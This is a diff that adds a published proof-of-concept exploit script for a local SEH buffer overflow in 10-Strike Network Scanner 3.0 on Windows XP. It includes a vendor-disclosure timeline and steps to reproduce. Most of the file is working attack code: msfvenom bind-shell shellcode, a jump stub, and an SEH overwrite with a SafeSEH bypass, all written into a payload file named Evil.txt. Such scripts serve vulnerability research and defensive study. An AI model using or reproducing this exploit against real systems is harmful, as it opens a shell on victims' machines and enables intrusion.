@@ -1,0 +1,85 @@
+# Exploit Title: 10-Strike Network Scanner 3.0 - Local Buffer Overflow (SEH)
+# Exploit Author: Hashim Jawad - ihack4falafel
+# Date: 2018-06-05
+# Vendor Homepage: https://www.10-strike.com/
+# Vulnerable Software: https://www.10-strike.com/network-scanner/network-scanner.exe
+# Tested on: Windows XP Professional - SP3 (x86)
+# Disclosure Timeline:
+# 06-02-18: Contacted vendor, no response 
+# 06-03-18: Contacted vendor, no response
+# 06-04-18: Contacted vendor, no response
+# 06-05-18: Proof of concept exploit published 
+
+# Steps to reproduce:
+# - Copy contents of Evil.txt and paste in 'Host name or address' field under Add host.
+# - Right-click on newly created host and click 'Trace route...'.
+# - Repeat the second step and boom.
+# Notes:
+# - '\x00' get converted to '\x20' by the program eliminating the possibility of using [pop, pop, retn] pointers in base binary.
+# - All loaded modules are compiled with /SafeSEH.
+# - Right-click on newly created host and click 'System information>General' is effected by the same vulnerability with different
+#   offsets and buffer size.
+# - root@kali:~# msfvenom -p windows/shell_bind_tcp -b '\x00\x0a\x0d' -v shellcode -f python
+# - Payload size: 355 bytes
+
+#!/usr/bin/python
+
+shellcode =  ""
+shellcode += "\xb8\x2b\x29\xa7\x48\xd9\xe8\xd9\x74\x24\xf4\x5b"
+shellcode += "\x29\xc9\xb1\x53\x31\x43\x12\x03\x43\x12\x83\xc0"
+shellcode += "\xd5\x45\xbd\xea\xce\x08\x3e\x12\x0f\x6d\xb6\xf7"
+shellcode += "\x3e\xad\xac\x7c\x10\x1d\xa6\xd0\x9d\xd6\xea\xc0"
+shellcode += "\x16\x9a\x22\xe7\x9f\x11\x15\xc6\x20\x09\x65\x49"
+shellcode += "\xa3\x50\xba\xa9\x9a\x9a\xcf\xa8\xdb\xc7\x22\xf8"
+shellcode += "\xb4\x8c\x91\xec\xb1\xd9\x29\x87\x8a\xcc\x29\x74"
+shellcode += "\x5a\xee\x18\x2b\xd0\xa9\xba\xca\x35\xc2\xf2\xd4"
+shellcode += "\x5a\xef\x4d\x6f\xa8\x9b\x4f\xb9\xe0\x64\xe3\x84"
+shellcode += "\xcc\x96\xfd\xc1\xeb\x48\x88\x3b\x08\xf4\x8b\xf8"
+shellcode += "\x72\x22\x19\x1a\xd4\xa1\xb9\xc6\xe4\x66\x5f\x8d"
+shellcode += "\xeb\xc3\x2b\xc9\xef\xd2\xf8\x62\x0b\x5e\xff\xa4"
+shellcode += "\x9d\x24\x24\x60\xc5\xff\x45\x31\xa3\xae\x7a\x21"
+shellcode += "\x0c\x0e\xdf\x2a\xa1\x5b\x52\x71\xae\xa8\x5f\x89"
+shellcode += "\x2e\xa7\xe8\xfa\x1c\x68\x43\x94\x2c\xe1\x4d\x63"
+shellcode += "\x52\xd8\x2a\xfb\xad\xe3\x4a\xd2\x69\xb7\x1a\x4c"
+shellcode += "\x5b\xb8\xf0\x8c\x64\x6d\x6c\x84\xc3\xde\x93\x69"
+shellcode += "\xb3\x8e\x13\xc1\x5c\xc5\x9b\x3e\x7c\xe6\x71\x57"
+shellcode += "\x15\x1b\x7a\x46\xba\x92\x9c\x02\x52\xf3\x37\xba"
+shellcode += "\x90\x20\x80\x5d\xea\x02\xb8\xc9\xa3\x44\x7f\xf6"
+shellcode += "\x33\x43\xd7\x60\xb8\x80\xe3\x91\xbf\x8c\x43\xc6"
+shellcode += "\x28\x5a\x02\xa5\xc9\x5b\x0f\x5d\x69\xc9\xd4\x9d"
+shellcode += "\xe4\xf2\x42\xca\xa1\xc5\x9a\x9e\x5f\x7f\x35\xbc"
+shellcode += "\x9d\x19\x7e\x04\x7a\xda\x81\x85\x0f\x66\xa6\x95"
+shellcode += "\xc9\x67\xe2\xc1\x85\x31\xbc\xbf\x63\xe8\x0e\x69"
+shellcode += "\x3a\x47\xd9\xfd\xbb\xab\xda\x7b\xc4\xe1\xac\x63"
+shellcode += "\x75\x5c\xe9\x9c\xba\x08\xfd\xe5\xa6\xa8\x02\x3c"
+shellcode += "\x63\xd8\x48\x1c\xc2\x71\x15\xf5\x56\x1c\xa6\x20"
+shellcode += "\x94\x19\x25\xc0\x65\xde\x35\xa1\x60\x9a\xf1\x5a"
+shellcode += "\x19\xb3\x97\x5c\x8e\xb4\xbd"
+
+magic  = '\xd9\xee'                             # fldz
+magic += '\xd9\x74\x24\xf4'                     # fnstenv [esp-0xc]
+magic += '\x59'                                 # pop ecx
+magic += '\x80\xc1\x05'                         # add cl,0x5
+magic += '\x80\xc1\x05'                         # add cl,0x5
+magic += '\x90'                                 # nop
+magic += '\xfe\xcd'                             # dec ch
+magic += '\xfe\xcd'                             # dec ch
+magic += '\xff\xe1'                             # jmp ecx 
+
+buffer  = '\x90' * 28                           # nops
+buffer += shellcode                             # bind shell
+buffer += '\xcc' * (516-28-len(shellcode))      # filler to nSEH 
+buffer += '\x75\x06\x74\x06'                    # nSEH | jump net
+buffer += '\x18\x05\xfc\x7f'                    # SEH  | 0x7ffc0518 : pop edi # pop edi # ret  [SafeSEH Bypass]
+buffer += '\x90' * 5                            # nops 
+buffer += magic                                 # jump -512
+buffer += '\xcc' * (3000-516-4-4-5-len(magic))  # junk
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except Exception as e:
+	print e
